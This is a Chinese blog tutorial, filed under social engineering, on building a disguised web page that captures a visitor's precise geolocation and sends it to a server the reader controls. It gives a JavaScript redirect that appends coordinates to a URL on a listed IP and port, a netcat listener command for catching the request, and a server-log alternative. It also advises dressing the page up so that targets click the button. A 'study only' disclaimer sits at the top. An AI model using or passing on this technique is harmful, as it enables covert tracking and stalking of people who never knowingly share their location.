<!--yml
category: 社会工程
date: 2022-11-10 10:28:49
-->

# 简单2步教你获取任意设备高精度定位-FancyPig's blog

> 来源：[https://www.iculture.cc/knowledge/pig=7971](https://www.iculture.cc/knowledge/pig=7971)

## 声明

以下教程仅用于学习研究目的，请勿用于非法用途

## 相关阅读

之前我们关于**[IP定位](https://www.iculture.cc/tag/ip%E5%AE%9A%E4%BD%8D)**的出过很多期教程了

但是很多人觉得麻烦，这次我们将再做一个简化，如何更简单的获取IP定位呢？

## 简介

本教程将教您通过一个页面，完成高精度定位的获取

## 在线体验

## 视频教程

## 图文教程

### 体验

点击获取定位，可以读取到精度和纬度信息

<figure class="wp-block-image size-full">![图片[1]-简单2步教你获取任意设备高精度定位-FancyPig's blog](img/e35154f10a9ecc3ba8f731edb05aff10.png)</figure>

这里会具体显示

<figure class="wp-block-image size-full">![图片[2]-简单2步教你获取任意设备高精度定位-FancyPig's blog](img/4d5f1ca3fb82b6234695be6803a9f44f.png)</figure>

但并不会传到服务器的日志

### 如何记录高精度定位信息

那么我们开启第26行代码，去掉`//`，然后填写您的网站路径或者是IP:端口

```
document.location="https://www.iculture.cc/demo/geo_result/"+ latlong;
```

可以通过2种方式来记录请求

*   方法一：服务器监听端口记录请求
*   方法二：服务器日志记录请求

#### 方法一

第一种是服务端口（记得检查安全组配置是否允许该端口，以及服务器防火墙是否开启该端口）

第26行代码，例如，我想让他监听服务器的5432端口

```
document.location="http://39.106.66.45:5432/"+ latlong;
```

然后，在服务器终端中输入

```
nc -lvvp 5432
```

等待请求结果

<figure class="wp-block-image size-large">![图片[3]-简单2步教你获取任意设备高精度定位-FancyPig's blog](img/533bcddcc96ad5fa3d19ace9dd26a86e.png)</figure>

#### 方法二

当然，如果你不会开启服务器端口，您也可以直接使用宝塔面板的日志功能，我们将重定向链接随意修改，可以是一个不存在的路径，但要在服务器的域名路径下， 第26行代码，例如

```
document.location="https://www.iculture.cc/demo/geo_result/"+ latlong;
```

然后去宝塔面板`/www/wwwlogs/`下寻找相关的日志文件，再从日志文件中查找日志详情即可（视频中有讲）

### 其他基础教程

如果您没有服务器，我们为您推荐

#### 特价服务器购买

下面是一些腾讯云的活动，强烈建议选择腾讯云学生机，一年也就400多块钱（2核4G 3M带宽）

当然您也可以选择[阿里云服务器](http://iculture.cc/aliyun)，或者[vultr国外服务器](https://iculture.cc/vultr)

#### 网站搭建教程

## 相关代码及工具

### 简陋版源代码

最基本的框架已经出来了，需要美化可以自行找模板

### URL编码/解码工具

下面是常用的在线URL编码解码工具

当然，您也可以使用本地离线工具

### 经纬度查询工具

你只需要输入获取的纬度,经度

然后用逗号隔开查询即可

## 美化问题

至于页面美化的问题，这个你可以随便找一个好看的页面，然后把提交按钮上加入`onclick="getLocation()"`，同时引入相关的javascript代码，非常简单！

我们这里以[乔碧萝](https://www.iculture.cc/knowledge/pig=261)之前的动漫款式为例

<figure class="wp-block-image size-full">![图片[4]-简单2步教你获取任意设备高精度定位-FancyPig's blog](img/ee5c462c3e59a3b91970b51c3fb1ff32.png)</figure>

下面讲一下美化的思路，附源码